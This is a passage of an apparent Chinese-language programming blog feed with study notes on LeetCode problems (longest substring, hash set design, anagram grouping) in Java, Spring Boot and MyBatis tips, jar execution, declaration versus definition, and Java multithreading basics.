class="line">            <span class="keyword">while</span> (rk + <span class="number">1</span> &lt; n &amp;&amp; !occ.contains(s.charAt(rk + <span class="number">1</span>))) &#123;</span><br><span class="line">                <span class="comment">// 不断地移动右指针</span></span><br><span class="line">                occ.add(s.charAt(rk + <span class="number">1</span>));</span><br><span class="line">                ++rk;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 第 i 到 rk 个字符是一个极长的无重复字符子串</span></span><br><span class="line">            ans = Math.max(ans, rk - i + <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>②我的代码（使用int数组保存状态）</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Question3</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Question3 question3 = <span class="keyword">new</span> Question3();</span><br><span class="line">        <span class="keyword">int</span> maxLength = question3.lengthOfLongestSubstring(<span class="string">&quot;dvdf&quot;</span>);</span><br><span class="line">        System.out.println(maxLength);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">lengthOfLongestSubstring</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (s.equals(<span class="string">&quot;&quot;</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span>[] length = <span class="keyword">new</span> <span class="keyword">int</span>[s.length()];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; length.length; i++) &#123;</span><br><span class="line">            length[i] = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> maxLength = length[<span class="number">0</span>];</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">char</span>[] charArray = s.toCharArray();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; charArray.length; i++) &#123;</span><br><span class="line">            <span class="keyword">int</span> diffStringLength = getLastCommonCharBefore(s, charArray[i], i - length[i - <span class="number">1</span>], i);</span><br><span class="line">            <span class="keyword">if</span> (diffStringLength == length[i - <span class="number">1</span>]) &#123;	<span class="comment">// 当前字符可以直接加入前一个字符所在子串</span></span><br><span class="line">                length[i] += length[i - <span class="number">1</span>];</span><br><span class="line">                maxLength = maxLength &gt; length[i] ? maxLength : length[i];</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;						<span class="comment">// 当前字符只能加入前一个字符所在子串的子串中去（即有字符和当前字符一样）</span></span><br><span class="line">                length[i] = diffStringLength + <span class="number">1</span>;</span><br><span class="line">                maxLength = maxLength &gt; length[i] ? maxLength : length[i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> maxLength;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string     源字符串</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> targetChar 查找的字符</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> startIndex 源字符串要查找字符范围的起点（包括）</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> endIndex   源字符串要查找字符范围的终点（不包括）</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 前一个字符所在的子串中可以与当前字符处在同一个子串中的子串的最大长度</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getLastCommonCharBefore</span><span class="params">(String string, <span class="keyword">char</span> targetChar, <span class="keyword">int</span> startIndex, <span class="keyword">int</span> endIndex)</span> </span>&#123;</span><br><span class="line">        String substring = string.substring(startIndex, endIndex);<span class="comment">// beginIndex：指定子串的起始索引位置（包含）,endIndex：指定子串的结束索引位置（不包含）</span></span><br><span class="line">        <span class="keyword">int</span> index = substring.indexOf(targetChar);</span><br><span class="line">        <span class="keyword">return</span> substring.length() - <span class="number">1</span> - index;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="方法二：暴力求解"><a href="#方法二：暴力求解" class="headerlink" title="方法二：暴力求解"></a>方法二：暴力求解</h4><p>思路：遍历所有子串进行判断</p>
<p>评价：一般不用</p>
]]></content>
      <tags>
        <tag>算法</tag>
        <tag>滑动窗口</tag>
      </tags>
  </entry>
  <entry>
    <title>力扣705-设计哈希集合（简单）</title>
    <url>/2024/04/16/%E5%8A%9B%E6%89%A3705-%E8%AE%BE%E8%AE%A1%E5%93%88%E5%B8%8C%E9%9B%86%E5%90%88%EF%BC%88%E7%AE%80%E5%8D%95%EF%BC%89/</url>
    <content><![CDATA[<h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><span id="more"></span>

<blockquote>
<p>不使用任何内建的哈希表库设计一个哈希集合（HashSet）。</p>
<p>实现 <code>MyHashSet</code> 类：</p>
<ul>
<li><code>void add(key)</code> 向哈希集合中插入值 <code>key</code> 。</li>
<li><code>bool contains(key)</code> 返回哈希集合中是否存在这个值 <code>key</code> 。</li>
<li><code>void remove(key)</code> 将给定值 <code>key</code> 从哈希集合中删除。如果哈希集合中没有这个值，什么也不做。</li>
</ul>
</blockquote>
<h4 id="方法一：链地址法"><a href="#方法一：链地址法" class="headerlink" title="方法一：链地址法"></a>方法一：链地址法</h4><p><strong>分析：</strong></p>
<p>设哈希表的大小为 <code>base</code>，则可以设计一个简单的哈希函数：<code>hash(x)=x mod base</code></p>
<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9waWMubGVldGNvZGUtY24uY29tL0ZpZ3VyZXMvNzA1LzcwNV9saW5rZWRfbGlzdC5wbmc?x-oss-process=image/format,png" alt="fig"></p>
<p><strong>算法：</strong></p>
<p>我们开辟一个大小为<code>base</code>的数组，数组的每个位置是一个链表。当计算出哈希值之后，就插入到对应位置的链表当中。</p>
<p>由于我们使用整数除法作为哈希函数，为了尽可能避免冲突，应当将<code>base</code>取为一个质数。在这里，我们取 <code>base = 769</code>。</p>
<p><strong>①官方代码（使用）</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyHashSet</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> BASE = <span class="number">769</span>;</span><br><span class="line">    <span class="keyword">private</span> LinkedList[] data;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** Initialize your data structure here. */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MyHashSet</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        data = <span class="keyword">new</span> LinkedList[BASE];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; BASE; ++i) &#123;</span><br><span class="line">            data[i] = <span class="keyword">new</span> LinkedList&lt;Integer&gt;();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> key)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> h = hash(key);</span><br><span class="line">        Iterator&lt;Integer&gt; iterator = data[h].iterator();</span><br><span class="line">        <span class="keyword">while</span> (iterator.hasNext()) &#123;</span><br><span class="line">            Integer element = iterator.next();</span><br><span class="line">            <span class="keyword">if</span> (element == key) &#123;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        data[h].offerLast(key);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">remove</span><span class="params">(<span class="keyword">int</span> key)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> h = hash(key);</span><br><span class="line">        Iterator&lt;Integer&gt; iterator = data[h].iterator();</span><br><span class="line">        <span class="keyword">while</span> (iterator.hasNext()) &#123;</span><br><span class="line">            Integer element = iterator.next();</span><br><span class="line">            <span class="keyword">if</span> (element == key) &#123;</span><br><span class="line">                data[h].remove(element);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/** Returns true if this set contains the specified element */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">contains</span><span class="params">(<span class="keyword">int</span> key)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> h = hash(key);</span><br><span class="line">        Iterator&lt;Integer&gt; iterator = data[h].iterator();</span><br><span class="line">        <span class="keyword">while</span> (iterator.hasNext()) &#123;</span><br><span class="line">            Integer element = iterator.next();</span><br><span class="line">            <span class="keyword">if</span> (element == key) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">hash</span><span class="params">(<span class="keyword">int</span> key)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> key % BASE;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>②我的代码（牺牲空间）</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyHashSet</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">int</span> base = <span class="number">1000001</span>;</span><br><span class="line"></span><br><span class="line">    MyNode[] myNodes;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MyHashSet</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        myNodes = <span class="keyword">new</span> MyNode[base];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> key)</span> </span>&#123;</span><br><span class="line">        MyNode newMyNode = myNodes[key];</span><br><span class="line">        <span class="keyword">if</span> (newMyNode == <span class="keyword">null</span>) &#123;</span><br><span class="line">            MyNode node = <span class="keyword">new</span> MyNode();</span><br><span class="line">            myNodes[key] = node;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// MyNode node = new MyNode();</span></span><br><span class="line">        <span class="comment">// node.next = myNodes[key];</span></span><br><span class="line">        <span class="comment">// myNodes[key] = node;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">remove</span><span class="params">(<span class="keyword">int</span> key)</span> </span>&#123;</span><br><span class="line">        MyNode newMyNode = myNodes[key];</span><br><span class="line">        <span class="keyword">if</span> (newMyNode == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        myNodes[key] = newMyNode.next;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">contains</span><span class="params">(<span class="keyword">int</span> key)</span> </span>&#123;</span><br><span class="line">        MyNode newMyNode = myNodes[key];</span><br><span class="line">        <span class="keyword">return</span> newMyNode != <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">MyNode</span> </span>&#123;</span><br><span class="line">        MyNode next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="方法二：开放地址法"><a href="#方法二：开放地址法" class="headerlink" title="方法二：开放地址法"></a>方法二：开放地址法</h4><p>当发现哈希值<code>h</code>处产生冲突时，根据某种策略，从<code>h</code>出发找到下一个不冲突的位置。例如，一种最简单的策略是，不断地检查 <code>h+1,h+2,h+3,…</code>这些整数对应的位置。</p>
<h4 id="方法三：在哈希法"><a href="#方法三：在哈希法" class="headerlink" title="方法三：在哈希法"></a>方法三：在哈希法</h4><p>当发现哈希冲突后，使用另一个哈希函数产生一个新的地址。</p>
]]></content>
      <tags>
        <tag>算法</tag>
        <tag>哈希</tag>
      </tags>
  </entry>
  <entry>
    <title>力扣49-字母异位词分组（中等）</title>
    <url>/2024/05/16/%E5%8A%9B%E6%89%A349-%E5%AD%97%E6%AF%8D%E5%BC%82%E4%BD%8D%E8%AF%8D%E5%88%86%E7%BB%84%EF%BC%88%E4%B8%AD%E7%AD%89%EF%BC%89/</url>
    <content><![CDATA[<h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><span id="more"></span>

<blockquote>
<ul>
<li><p>给你一个字符串数组，请你将 <strong>字母异位词</strong> 组合在一起。可以按任意顺序返回结果列表。</p>
<p><strong>字母异位词</strong> 是由重新排列源单词的所有字母得到的一个新单词。</p>
</li>
</ul>
</blockquote>
<h4 id="方法一：排序"><a href="#方法一：排序" class="headerlink" title="方法一：排序"></a>方法一：排序</h4><p><strong>思路</strong></p>
<p>由于互为字母异位词的两个字符串包含的字母相同，因此对两个字符串分别进行排序之后得到的字符串一定是相同的，故可以将排序之后的字符串作为哈希表的键。</p>
<p><strong>代码</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;String&gt;&gt; groupAnagrams(String[] strs) &#123;</span><br><span class="line">        Map&lt;String, List&lt;String&gt;&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (String str : strs) &#123;</span><br><span class="line">            String sortStr = strSort(str);</span><br><span class="line">            <span class="keyword">if</span> (map.containsKey(sortStr)) &#123;</span><br><span class="line">                map.get(sortStr).add(str);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                List&lt;String&gt; list = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">                list.add(str);</span><br><span class="line">                map.put(sortStr, list);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        List&lt;List&lt;String&gt;&gt; result = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        Set&lt;String&gt; sortStrKeys = map.keySet();</span><br><span class="line">        <span class="keyword">for</span> (String sortStrKey : sortStrKeys) &#123;</span><br><span class="line">            List&lt;String&gt; list = map.get(sortStrKey);</span><br><span class="line">            result.add(list);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">	</span><br><span class="line">    <span class="comment">// 对字符串进行排序，使用Arrays.sort工具直接排序</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">strSort</span><span class="params">(String string)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">char</span>[] chars = string.toCharArray();</span><br><span class="line">        Arrays.sort(chars);</span><br><span class="line">        <span class="comment">// String string1 = chars.toString();</span></span><br><span class="line">        String string1 = <span class="keyword">new</span> String(chars);</span><br><span class="line">        <span class="keyword">return</span> string1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>复杂度分析</strong></p>
<p>时间复杂度：<em>O</em>(<em>nk</em>log<em>k</em>)，其中 <em>n</em>是 <em>strs</em> 中的字符串的数量，<em>k</em>是 <em>strs</em> 中的字符串的的最大长度。需要遍历 <em>n</em> 个字符串，对于每个字符串，需要 <em>O</em>(<em>k</em>log<em>k</em>)的时间进行排序以及 <em>O</em>(1) 的时间更新哈希表，因此总时间复杂度是 <em>O</em>(<em>nk</em>log<em>k</em>)。</p>
<p>空间复杂度：<em>O</em>(<em>nk</em>)，其中 <em>n</em> 是 <em>strs</em> 中的字符串的数量，<em>k</em> 是 <em>strs</em> 中的字符串的的最大长度。需要用哈希表存储全部字符串。</p>
]]></content>
      <tags>
        <tag>算法</tag>
        <tag>哈希</tag>
        <tag>排序</tag>
      </tags>
  </entry>
  <entry>
    <title>后端和数据库经验</title>
    <url>/2023/05/29/%E5%90%8E%E7%AB%AF%E5%92%8C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%BB%8F%E9%AA%8C/</url>
    <content><![CDATA[<h2 id="后端和数据库经验"><a href="#后端和数据库经验" class="headerlink" title="后端和数据库经验"></a>后端和数据库经验</h2><span id="more"></span>

<h4 id="Spring-Boot后端，接收post请求中的数据"><a href="#Spring-Boot后端，接收post请求中的数据" class="headerlink" title="Spring Boot后端，接收post请求中的数据"></a>Spring Boot后端，接收post请求中的数据</h4><p>在使用springboot接受前端传来的文件数据时，如果@controller的方法没有加@ResponseBody，则会出现：请求成功进入了springboot服务器，但是，前端依旧会报404错误<br>（网上有大佬解释说：@ResponseBody的作用时将return的值作为合同谈判请求的内容返回给客户端，也就是说前台直接当成json来接收后台返回的数据；如果不屑@ResponseBody注解，http请求的内容默认是一个页面，有了这个注解就是json字符串了）</p>
<p>接收前端的post请求，要获取数据，使用 @RequestBody，而不是 @RequestParam</p>
<h4 id="Mybatis中比较数据库的语句"><a href="#Mybatis中比较数据库的语句" class="headerlink" title="Mybatis中比较数据库的语句"></a>Mybatis中比较数据库的语句</h4><ol>
<li><p>mybatis的xml文件中的字符串比较，可以直接使用==和!=</p>
</li>
<li><p>进行字符串的模糊查询，在xml中可以通过mysql自带的concat直接实现</p>
</li>
<li><p>where标签能省略语句中的前缀 and，但是它省略不了语句中的后缀and</p>
</li>
</ol>
<h4 id="Sql语句技巧"><a href="#Sql语句技巧" class="headerlink" title="Sql语句技巧"></a>Sql语句技巧</h4><ol>
<li><p>字符串的拼接可以使用concat（a,b,…）</p>
</li>
<li><p>字段的相等比较使用 = ，而不是 == </p>
</li>
</ol>
]]></content>
      <tags>
        <tag>后端</tag>
        <tag>数据库</tag>
      </tags>
  </entry>
  <entry>
    <title>命令行运行jar文件和点击运行jar文件区别</title>
    <url>/2022/02/20/%E5%91%BD%E4%BB%A4%E8%A1%8C%E8%BF%90%E8%A1%8Cjar%E6%96%87%E4%BB%B6%E5%92%8C%E7%82%B9%E5%87%BB%E8%BF%90%E8%A1%8Cjar%E6%96%87%E4%BB%B6%E5%8C%BA%E5%88%AB/</url>
    <content><![CDATA[<h2 id="共同点"><a href="#共同点" class="headerlink" title="共同点"></a>共同点</h2><span id="more"></span>

<p><img src="https://s2.loli.net/2022/02/20/1mPEyZlcGMQgzJS.png" alt="image-20220220174307272"></p>
<p>①应用程序都可以成功运行</p>
<p>②可能会生成一些其他文件</p>
<p><img src="https://s2.loli.net/2022/02/20/vq1sck58zLWEyD7.png" alt="image-20220220175111112"></p>
<h2 id="二者区别"><a href="#二者区别" class="headerlink" title="二者区别"></a>二者区别</h2><h3 id="①点击运行jar文件"><a href="#①点击运行jar文件" class="headerlink" title="①点击运行jar文件"></a>①点击运行jar文件</h3><p>jar文件可以得到运行，同时区别于命令行运行在于：①在windows后台里<strong>会有</strong><code>java(TM)platform se binary</code>服务在运行</p>
<p><img src="https://s2.loli.net/2022/02/20/S3qAdHmZJBfY17e.png" alt="image-20220220174028561"></p>
<p><strong>注意：要删除生成的文件，需要先结束这个服务的运行</strong></p>
<h3 id="②命令行运行jar文件"><a href="#②命令行运行jar文件" class="headerlink" title="②命令行运行jar文件"></a>②命令行运行jar文件</h3><p><img src="https://s2.loli.net/2022/02/20/cWVJPYpe5q9AtRB.png" alt="image-20220220174543702"></p>
<p>jar文件可以成功运行，区别在于：①在windows后台里<strong>不会有</strong><code>java(TM)platform se binary</code>服务在运行</p>
<p><img src="https://s2.loli.net/2022/02/20/9txvJu82OVLyG6d.png" alt="image-20220220174842366"></p>
]]></content>
      <tags>
        <tag>jar文件</tag>
        <tag>windows后台应用</tag>
      </tags>
  </entry>
  <entry>
    <title>声明和定义的区别</title>
    <url>/2021/10/16/%E5%A3%B0%E6%98%8E%E5%92%8C%E5%AE%9A%E4%B9%89%E7%9A%84%E5%8C%BA%E5%88%AB/</url>
    <content><![CDATA[<h2 id="声明和定义的区别"><a href="#声明和定义的区别" class="headerlink" title="声明和定义的区别"></a>声明和定义的区别</h2><span id="more"></span>

<p><strong>定义：</strong>会分配一定的内存空间</p>
<p>常见的定义方式，如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> a;		<span class="comment">//编译器会给变量a分配一定的内存空间（4个字节）</span></span><br></pre></td></tr></table></figure>

<p><strong>声明：</strong>仅仅告诉编译器，有这么个东西，让编译器”认识“这个东西，不一定会分配内存空间</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="keyword">int</span> a;	<span class="comment">//编译器仅“认识”a，但没有分配内存空间</span></span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>编程基础</tag>
        <tag>声明、定义区别</tag>
      </tags>
  </entry>
  <entry>
    <title>多线程</title>
    <url>/2021/08/26/%E5%A4%9A%E7%BA%BF%E7%A8%8B/</url>
    <content><![CDATA[<h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><span id="more"></span>

<p><strong>程序</strong>是指令和数据的有序集合，其本身没有任何运行的含义，是一个静态的概念</p>
<p><strong>进程</strong>是执行程序的一次执行过程，它是一个动态的概念。是系统资源分配的单位</p>
<p>通常在一个进程中可以包含多个<strong>线程</strong>当然一个进程中至少有一个线程，不然没有存在的意义。</p>
<p><strong>线程是CPU调度和执行的单位</strong></p>
<p>注意：<strong>很多多线程是模拟出来的</strong>，真正的多线程是指由多个CPU，即多核，如服务器。如果是模拟出来的多线程，即在一个CPU的情况下，在同一个时间点，CPU只能执行一个代码，因为切换的很快，所以就有同时执行的错觉</p>
<h2 id="本章核心概念"><a href="#本章核心概念" class="headerlink" title="本章核心概念"></a>本章核心概念</h2><ul>
<li>线程是独立的执行路径</li>
<li>在程序运行时，即使没有自己创建线程，后台也会有多个线程，如主线程，gc（garbage collection）线程；</li>
<li>main（）称之为主线程，为系统的入口，用于执行整个程序</li>
</ul>
<blockquote>
<p>Java程序都是以main()作为入口的。main函数是一个线程（主线程），同时还是一个进程。在现在的操作系统中，都是多线程的。但是它执行的时候，对外来说就是一个<strong>独立的进程</strong>。这个进程，可以包含多个线程，也可以只包含一个线程</p>
<p>主线程的重要性体现在两个方面：</p>
<ol>
<li>是产生其他子线程的线程</li>
<li>通常它必须最后完成执行，比如执行各种关闭操作</li>
</ol>
<p>线程之间的关系、执行关系如图示：</p>
<img src="https://i.loli.net/2021/08/26/CbYhJ3KRv9HZFUk.png" alt="image-20210826172535380" style="zoom: 33%;" />
</blockquote>
<ul>
<li>在一个进程中，如果开辟了多个线程，线程的运行由调度器安排调度，调度器是与操作系统紧密相关的，先后顺序是不能人为的干预的</li>
<li>对同一份资源操作时，会存在资源抢夺的问题，需要加入并发控制</li>
<li>线程会带来额外的开销，如CPU调度时间，并发控制开销</li>
<li>每个线程在自己的工作内存交互，内存控制不当会造成数据不一致</li>
</ul>
<h2 id="继承Thread类"><a href="#继承Thread类" class="headerlink" title="继承Thread类"></a>继承Thread类</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Thread</span></span></span><br><span class="line"><span class="class"><span class="keyword">extends</span> <span class="title">Object</span></span></span><br><span class="line"><span class="class"><span class="keyword">implements</span> <span class="title">Runnable</span></span></span><br></pre></td></tr></table></figure>

<p>线程是程序中的执行线程。<strong>Java虚拟机允许应用程序同时运行多个执行线程</strong></p>
<p>每个线程都有<strong>优先级</strong>，CPU按优先级调度执行线程</p>
<p>当Java虚拟机启动时，通常有一个<strong>非守护进程线程</strong>（通常是调用某些指定类的名为main的方法）。<strong>Java虚拟机将继续执行线程，直到发生以下任一情况</strong>：</p>
<ul>
<li>已经调用了Runtime类的exit方法，并且安全管理器已经允许进行退出操作</li>
<li>所有不是守护进程线程的线程已经死亡，无论是从调用返回到run方法还是抛出超出run方法的run。</li>
</ul>
<p><strong>创建一个新的执行线程有两种方法：</strong></p>
<ul>
<li><p>一个是将一个类声明为Thread的子类。这个子类应该重写run类的方法Thread。然后可以分配并启动子类的实例。</p>
</li>
<li><p>另一种方法来创建一个线程是声明实现类Runnable接口。那个类然后实现了run方法。然后可以分配类的实例，在创建Thread时作为参数传递，并启动。</p>
</li>
</ul>
<h2 id="创建线程实例"><a href="#创建线程实例" class="headerlink" title="创建线程实例"></a>创建线程实例</h2><h3 id="法一：继承自Thread类"><a href="#法一：继承自Thread类" class="headerlink" title="法一：继承自Thread类"></a>法一：继承自Thread类</h3><p><strong>步骤：</strong></p>
<ul>
<li>自定义线程类继承<strong>Thread类</strong></li>
<li>重写**run()**方法</li>
<li>创建线程对象，调用**start()**方法启动线程</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 创建线程方式1：继承Thread类，重写run方法，调用start开启线程</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestThread1</span> <span class="keyword">extends</span> <span class="title">Thread</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">// run方法线程体</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">20</span>; i++) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;我在看代码-----&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// main线程，主线程</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建一个线程对象，CPU按优先级调度</span></span><br><span class="line">        TestThread1 testThread1 = <span class="keyword">new</span> TestThread1();</span><br><span class="line">        <span class="comment">// 调用start()方法开启线程，执行线程的run函数</span></span><br><span class="line">        testThread1.start();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">200</span>; i++) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;我在学习多线程-----&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>执行结果：</p>
<img src="https://i.loli.net/2021/08/26/exThCw1aboi5pM6.png" alt="image-20210826155918945" style="zoom:50%;" />

<p>执行时，线程和线程同时执行，CPU按优先级调度</p>
<blockquote>
<p><strong>总结：</strong>注意，线程开启不一定立即执行，由CPU调度执行</p>
</blockquote>
<h3 id="法二：实现类Runnable接口"><a href="#法二：实现类Runnable接口" class="headerlink" title="法二：实现类Runnable接口"></a>法二：实现类Runnable接口</h3><p>步骤：</p>
<ul>
<li>定义类<strong>实现Runnable接口</strong></li>
<li>**实现run()**方法，编写线程执行体</li>
<li>创建线程对象，调用**start()**方法启动线程</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 创建线程方式2：实现Runnable接口，重写run方法，执行线程需要丢入Runnable接口实现类，调用start方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestThread3</span> <span class="keyword">implements</span> <span class="title">Runnable</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">// run方法线程体</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">20</span>; i++) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;我在看代码-----&quot;</span> + i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// main线程，主线程</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建一个Runnable接口的实现类对象</span></span><br><span class="line">        TestThread3 testThread3 = <span class="keyword">new</span> TestThread3();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 类似于静态代理模式</span></span><br><span class="line">        <span class="keyword">new</span> Thread(testThread3).start();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">200</span>; i++) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;我在学习多线程-----&quot;</span> + i);</span><br><span class="line">        &#125;</span><br><span class="line">    